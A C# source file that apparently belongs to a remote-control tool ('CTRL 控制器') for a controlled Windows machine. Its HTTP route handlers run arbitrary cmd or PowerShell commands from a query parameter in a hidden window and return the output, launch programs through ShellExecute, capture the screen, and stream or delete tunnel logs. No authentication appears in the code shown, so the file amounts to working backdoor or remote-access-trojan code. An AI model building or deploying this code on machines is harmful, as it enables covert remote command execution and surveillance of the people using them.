using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Specialized;
using System.Reflection;
using System.Reflection.Metadata;

namespace ctrl
{
    public enum ShowWinCmd
    {
        //隐藏窗体，并激活另一个窗体
        SW_HIDE = 0,
        //与SW_RESTORE相同
        SW_SHOWNORMAL = 1,
        SW_NORMAL = 1,
        //激活并以最小化的形式显示窗体
        SW_SHOWMINIMIZED = 2,
        //激活并以最大化的形式显示窗体
        SW_SHOWMAXIMIZED = 3,
        //最大化指定的窗体
        SW_MAXIMIZE = 3,
        //以上次的状态显示指定的窗体，但不激活它
        SW_SHOWNOACTIVATE = 4,
        //激活窗体，并将其显示在当前的大小和位置上
        SW_SHOW = 5,
        //最小化指定的窗体，并激活另一个窗体
        SW_MINIMIZE = 6,
        //以最小化形式显示指定的窗体，但不激活它
        SW_SHOWMINNOACTIVE = 7,
        //以当前的状态显示指定的窗体，但不激活它
        SW_SHOWNA = 8,
        //以原本的大小和位置，激活并显示指定的窗体
        SW_RESTORE = 9,
        //设置显示的状态由STARTUPINFO结构体指定
        SW_SHOWDEFAULT = 10,
        SW_MAX = 10
    }

    internal class HTTPRoutes(Response res, NameValueCollection arg)
    {
        public void Index()
        {
            Type type = typeof(HTTPRoutes);
            MethodInfo[] methodInfo = type.GetMethods();
            StreamReturn bs = res.BeginSend(ContentType.Text);

            bs.Write("CTRL 控制器运行中...\n\n");

            foreach (MethodInfo mInfo in methodInfo)
            {
                if (mInfo.DeclaringType == type)
                    bs.Write(mInfo.Name + "\n");
            }

            bs.EndSend();
        }

        public void StopServer()
        {
            HTTPServer.StopServer();
            res.Text("已关闭 CTRL 控制器");
        }

        public void BaseExec()
        {
            string? cmdStr = arg["c"];
            string? ps = arg["ps"];
            string file = "cmd";

            if (cmdStr is null)
            {
                res.Text("在被控端执行命令，默认以 cmd 执行，使用可选参数 ps 则以 PowerShell 执行\n格式：?c=命令[&ps]");

                return;
            }

            if (ps is not null || ps == "ps")
                file = "powershell";

            Process p = new();
                    p.StartInfo.FileName = file + ".exe";
                    p.StartInfo.Arguments = "/c " + cmdStr;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.Start();

            string output = p.StandardOutput.ReadToEnd();

            if (output == "")
            {
                output = p.StandardError.ReadToEnd();
                if (output == "")
                {
                    output = "无回显...";
                }
            }

            p.WaitForExit();
            p.Close();

            res.Text(output);
        }

        public void BaseRun()
        {
            NameValueCollection RC = new()
            {
                { "0", "OOM 内存不足" },
                { "2", "ERROR_FILE_NOT_FOUND 文件名错误" },
                { "3", "ERROR_PATH_NOT_FOUND 路径名错误" },
                { "11", "ERROR_BAD_FORMAT EXE 文件无效" },
                { "26", "SE_ERR_SHARE 发生共享错误" },
                { "27", "SE_ERR_ASSOCINCOMPLETE 文件名不完全或无效" },
                { "28", "SE_ERR_DDETIMEOUT 超时" },
                { "29", "SE_ERR_DDEFAIL DDE 事务失败" },
                { "30", "SE_ERR_DDEBUSY 正在处理其他 DDE 事务而不能完成该 DDE 事务" },
                { "31", "SE_ERR_NOASSOC 没有相关联的应用程序" },
                { "42", "RUN_OK 运行成功" }
            };

            string? f = arg["f"];

            if (f is null)
            {
                res.Text("弥补 cmd 无法在被控端运行程序，可在这进行运行。\n格式：?f=文件路径[&o=操作类型][&p=参数][&d=默认目录][&s=窗口设置项]\n文档：https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea");
                return;
            }

            string? o = arg["o"] ?? "open";
            string? p = arg["p"] ?? "";
            string? d = arg["d"] ?? "";
            string? s = arg["s"];

            if (!int.TryParse(s, out int S))
                S = (int)ShowWinCmd.SW_NORMAL;

            [DllImport("shell32.dll")]
            static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);
            string result = ShellExecute(0, o, f, p, d, S).ToString();
            res.Text(RC[result] ?? result);
        }

        public void TunnelLog()
        {
            StreamReturn sr = res.BeginSend(ContentType.Text);
            new Tunnel().BeginLogging(sr);
        }

        public void TunnelLogEnd()
        {
            if (!Tunnel.logOutThreadRun)
            {
                res.Text("未启动日志输出线程，无需关闭");
                return;
            }

            Tunnel.logOutThreadRun = false;
            res.Text("已关闭日志输出线程");
        }

        public void TunnelLogClear()
        {
            if (Tunnel.DeleteLogFile(out string? err))
                res.Text("已清除所有日志信息");
            else
                res.Text("清除日志信息失败 " + err);
        }

        public void Screenshot()
        {
            Screen screen = Screen.PrimaryScreen ?? Screen.AllScreens[0];
            Bitmap image = new(screen.Bounds.Width, screen.Bounds.Height);
            Graphics g = Graphics.FromImage(image);
            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), screen.Bounds.Size);
            g.Dispose();

            res.Img(image);
        }
    }
}
